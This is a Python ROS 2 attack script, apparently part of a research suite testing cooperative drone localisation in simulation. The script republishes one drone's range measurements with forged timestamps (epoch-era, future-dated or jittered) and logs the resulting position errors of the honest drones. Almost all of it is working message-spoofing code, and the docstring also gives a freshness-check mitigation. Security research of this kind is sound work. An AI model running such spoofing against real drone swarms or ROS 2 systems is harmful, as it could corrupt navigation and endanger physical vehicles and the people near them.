#!/usr/bin/env python3
"""
Timestamp Manipulation / Time-Sync Attack  (Enhancement 5)
===========================================================
Exploits the absence of freshness validation in the cooperative localisation
stack.  Republishes range measurements with deliberately falsified ROS 2
message timestamps, targeting two failure modes:

MODE A — "ancient" timestamps (FAR_PAST):
  Sets message stamp to epoch + 1 second (~1970-01-01).  Demonstrates
  the finding noted in the README: "PX4 accepted ~56-year-old timestamps
  with zero freshness validation."  Any mitigation that checks
  header.stamp for freshness (e.g. rejecting messages older than 1s)
  would block this.  None of the current six approaches does this check.

MODE B — "future" timestamps (FAR_FUTURE):
  Sets message stamp to now + FUTURE_OFFSET seconds.  This can confuse
  DDS QoS deadline policies and may cause ROS 2 subscribers with
  sensor_data or best_effort QoS to either reject or hold these messages
  until the wall clock catches up.

MODE C — "jitter" timestamps (JITTER):
  Adds random ±JITTER_SEC noise to message timestamps.  In a time-
  synchronised swarm, this causes localisation nodes to see inconsistent
  measurement ages across drones, breaking any relative-time filtering.

Evil drone: px4_2 (standard evil-drone convention across this attack suite)
Honest drones: px4_1, px4_3, px4_4, px4_5

Security implication:
  This attack demonstrates that the measurement pipeline has NO freshness
  mechanism.  All six localisation approaches consume any message that
  arrives on a subscribed topic, regardless of its stated timestamp.

  Mitigation:  Add a freshness gate in each localisation node:
    age = (self.get_clock().now() - rclpy.time.Time.from_msg(msg.header.stamp)).nanoseconds / 1e9
    if age > MAX_MSG_AGE_SEC or age < 0:
        self.get_logger().warn(f"Stale/future message from {nbr} (age={age:.2f}s) — rejected")
        return

Run:
    ros2 run swarm_discovery timesync_attack
    ros2 run swarm_discovery timesync_attack ancient   # mode A (default)
    ros2 run swarm_discovery timesync_attack future
    ros2 run swarm_discovery timesync_attack jitter

Smoke test (short run, for parameter tuning):
    SMOKE_ATTACK_SEC=20 SMOKE_WARMUP_SEC=3 \\
        ros2 run swarm_discovery timesync_attack ancient

STRIDE: Spoofing, Denial of Service

PATCH NOTES (validation pass):
  - No logic change required: EVIL_DRONE already px4_2, matching the
    standardised evil-drone convention used across the attack suite.
  - ATTACK_SEC / WARMUP_SEC overridable via env vars for smoke testing.
  - Validation: validate_attacks.py::check_timesync confirms
    injected_stamp_sec matches the expected pattern per mode (near-zero
    for ancient, far-future epoch for future, wide spread for jitter).
"""
import os, sys, csv, time, random
import numpy as np
import rclpy
from rclpy.node import Node
from rclpy.time import Time as RCLTime
from builtin_interfaces.msg import Time as TimeMsg
from geometry_msgs.msg import PoseStamped, PointStamped

EVIL_DRONE    = "px4_2"
HONEST_DRONES = ["px4_1", "px4_3", "px4_4", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]

ATTACK_MODE   = "ancient"    # ancient | future | jitter
FUTURE_OFFSET = 30.0         # seconds into the future (mode B)
JITTER_SEC    = 2.0          # ±seconds of timestamp noise (mode C)
WARMUP_SEC    = float(os.environ.get("SMOKE_WARMUP_SEC", 10.0))
ATTACK_SEC    = float(os.environ.get("SMOKE_ATTACK_SEC", 90.0))
PUBLISH_HZ    = 25.0
LOG_FILE      = "/tmp/timesync_attack_metrics.csv"


def make_timestamp(mode, clock_now, rng):
    """Return a falsified builtin_interfaces/Time message."""
    msg = TimeMsg()
    if mode == "ancient":
        # ~56-year-old timestamp (seconds since epoch=1)
        msg.sec  = 1
        msg.nanosec = 0
    elif mode == "future":
        now_sec = clock_now.nanoseconds / 1e9
        fut_sec = now_sec + FUTURE_OFFSET
        msg.sec     = int(fut_sec)
        msg.nanosec = int((fut_sec - int(fut_sec)) * 1e9)
    elif mode == "jitter":
        now_sec  = clock_now.nanoseconds / 1e9
        jitter   = rng.uniform(-JITTER_SEC, JITTER_SEC)
        jit_sec  = max(0.0, now_sec + jitter)
        msg.sec     = int(jit_sec)
        msg.nanosec = int((jit_sec - int(jit_sec)) * 1e9)
    else:
        raise ValueError(f"Unknown mode: {mode}")
    return msg


class TimeSyncAttack(Node):
    def __init__(self, mode):
        super().__init__("timesync_attack")
        self.mode       = mode
        self.start_time = time.monotonic()
        self._rng       = np.random.default_rng(seed=42)
        self._buffer    = {}  # (observer, observed) → latest msg
        self.est        = {d: None for d in HONEST_DRONES}
        self.gt         = {d: None for d in ALL_DRONES}

        # Capture all range measurements
        for observer in ALL_DRONES:
            for observed in ALL_DRONES:
                if observer == observed:
                    continue
                self.create_subscription(
                    PointStamped,
                    f"/{observer}/coop/range_to/{observed}",
                    lambda msg, o=observer, d=observed: self._on_range(o, d, msg),
                    10)

        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped,
                f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped,
                f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y,
                    msg.pose.position.z])}), 10)

        # Re-publish evil drone's range messages with falsified timestamps
        self._tampered_pubs = {}
        for observed in HONEST_DRONES:
            topic = f"/{EVIL_DRONE}/coop/range_to/{observed}"
            self._tampered_pubs[(EVIL_DRONE, observed)] = self.create_publisher(
                PointStamped, topic, 10)

        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        header = ["t_s", "phase", "mode", "injected_stamp_sec"]
        for d in HONEST_DRONES:
            header += [f"{d}_est_x", f"{d}_est_y", f"{d}_est_z",
                       f"{d}_gt_x",  f"{d}_gt_y",  f"{d}_gt_z",
                       f"{d}_error_m"]
        self._csv.writerow(header)

        self.create_timer(1.0 / PUBLISH_HZ, self._tick)
        self.get_logger().warn(
            f"[TIMESYNC] mode={mode} warmup={WARMUP_SEC}s "
            f"attack_window={ATTACK_SEC:.0f}s | "
            f"This attack exploits absent freshness validation in all 6 localisation nodes")

    def _on_range(self, observer, observed, msg):
        self._buffer[(observer, observed)] = msg

    def _tick(self):
        elapsed = time.monotonic() - self.start_time
        phase   = "warmup" if elapsed < WARMUP_SEC else "attack"
        injected_stamp = 0.0

        if elapsed > ATTACK_SEC:
            self.get_logger().info("[TIMESYNC] Complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        if phase == "attack":
            now_rcl = self.get_clock().now()
            fake_stamp = make_timestamp(self.mode, now_rcl, self._rng)
            injected_stamp = fake_stamp.sec + fake_stamp.nanosec / 1e9

            for observed in HONEST_DRONES:
                original = self._buffer.get((EVIL_DRONE, observed))
                if original is None:
                    continue
                tampered = PointStamped()
                tampered.header.stamp    = fake_stamp        # ← falsified timestamp
                tampered.header.frame_id = "world"
                tampered.point.x         = original.point.x
                tampered.point.y         = original.point.y
                tampered.point.z         = original.point.z
                self._tampered_pubs[(EVIL_DRONE, observed)].publish(tampered)

        row = [f"{elapsed:.3f}", phase, self.mode, f"{injected_stamp:.3f}"]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}",
                        f"{err:.4f}"]
            else:
                row += [""] * 7
        self._csv.writerow(row)

        if int(elapsed) % 10 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            parts = []
            for d in HONEST_DRONES:
                e, g = self.est.get(d), self.gt.get(d)
                if e is not None and g is not None:
                    parts.append(f"{d}={np.linalg.norm(e-g):.3f}m")
            self.get_logger().warn(
                f"[TIMESYNC t={elapsed:.0f}s mode={self.mode}] "
                f"stamp={injected_stamp:.1f}s | {' | '.join(parts)}")


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else ATTACK_MODE
    if mode not in ("ancient", "future", "jitter"):
        print(f"Unknown mode '{mode}'. Choose: ancient | future | jitter")
        sys.exit(1)
    rclpy.init()
    node = TimeSyncAttack(mode)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
